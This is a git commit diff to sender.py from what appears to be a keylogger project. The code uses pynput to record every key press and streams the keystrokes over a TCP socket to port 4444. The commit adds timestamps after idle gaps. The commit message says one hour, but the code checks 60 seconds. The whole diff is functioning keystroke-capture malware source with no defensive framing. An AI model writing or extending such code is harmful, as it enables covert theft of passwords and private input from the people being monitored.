b4d6b7388fec97016ad304a5cebf891aca754da2
your name <you@example.com>
2025-08-25 04:15:13 -0400

    Added sending a timestamp if data transmitting starts after one hour after the last transmitted data

--- sender.py
+++ sender.py
@@ -1,17 +1,28 @@
 import socket
 from pynput import keyboard
+import time
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client_socket.connect(('127.0.0.1', 4444))
 
 def on_press(key):
     try:
+        global end_time
+        end_time = time.time()
+        if(end_time - start_time > 60):
+            timestamp_to_send = "[ " + str(end_time) + " ]" + '\n'
+            client_socket.send(timestamp_to_send.encode('utf-8'))
         client_socket.send(str(key).encode('utf-8'))
     except Exception as e:
         print("Error occured: ", e)
+        return
+
+def on_release(key):
+    global start_time
+    start_time = time.time()
 
 def main():
-    with keyboard.Listener(on_press=on_press) as listener:
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
 
